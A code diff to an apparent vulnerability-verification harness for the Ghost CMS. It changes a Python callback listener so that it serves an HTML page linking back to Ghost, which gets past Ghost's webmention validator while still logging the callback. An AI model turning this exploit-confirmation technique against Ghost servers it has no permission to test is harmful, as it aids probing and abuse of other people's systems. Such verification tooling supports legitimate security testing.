@@ -478,14 +478,19 @@ def verify_ghost_cve(
             # Start a minimal HTTP listener container in Ghost's network
             listener_name = f"bo_ghost_listener_{os.urandom(4).hex()}"
             listener_port = 9988
-            # Simple Python one-liner: listen for one request, print token when hit
+            # Listener responds with HTML that contains a link to Ghost's base URL so
+            # Ghost's webmention validator accepts the source page as a valid webmention.
             _listener_cmd = (
                 f"python3 -c \""
                 f"import http.server,socketserver;"
                 f"class H(http.server.BaseHTTPRequestHandler):"
                 f"  def do_GET(self):"
+                f"    body=b'<html><body><a href=\\\"{base_url}/\\\">link</a></body></html>';"
                 f"    self.send_response(200);"
+                f"    self.send_header('Content-Type','text/html');"
+                f"    self.send_header('Content-Length',str(len(body)));"
                 f"    self.end_headers();"
+                f"    self.wfile.write(body);"
                 f"    print('CALLBACK:'+self.path,flush=True);"
                 f"  def log_message(self,*a):pass;"
                 f"socketserver.TCPServer(('0.0.0.0',{listener_port}),H).handle_request()\""
